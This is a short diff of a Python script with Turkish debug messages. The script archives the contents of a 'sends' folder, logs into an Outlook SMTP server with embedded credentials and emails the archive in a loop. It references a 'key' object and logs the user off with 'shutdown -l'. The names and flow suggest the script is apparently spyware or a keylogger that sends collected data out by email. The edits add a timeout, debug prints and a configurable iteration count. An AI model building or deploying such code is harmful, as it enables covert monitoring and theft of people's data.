@@ -41,7 +41,7 @@ if connect():
     # ----------------------------
     i = 0
     if os.path.exists("sends"):
-        shutil.rmtree("bla")
+        shutil.rmtree("sends")
         print("silindi")
     if os.path.exists("sends.zip"):
         os.remove("sends.zip")
@@ -130,10 +130,12 @@ while b:
             arsiv.write(dosya)
     # login
     # try:
-    mail = smtplib.SMTP('smtp-mail.outlook.com', 587)
+    print("önce")
+    mail = smtplib.SMTP('smtp-mail.outlook.com', 587, timeout=None)
     mail.ehlo()
     mail.starttls()
     mail.login(user, passw)
+    print("sonra")
     # except:
     #    None
     mesaj = MIMEMultipart()
@@ -158,7 +160,7 @@ while b:
     # print("mailsend hata")
     mail.close()
     print(str(i) + ". iterasyon sonu")
-    if i == 1:
+    if i == turn:
         key.__setattr__('c', 0)
         b = False
     else:
@@ -178,3 +180,6 @@ try:
         os.system("shutdown -l")
 except:
     None
+
+
+
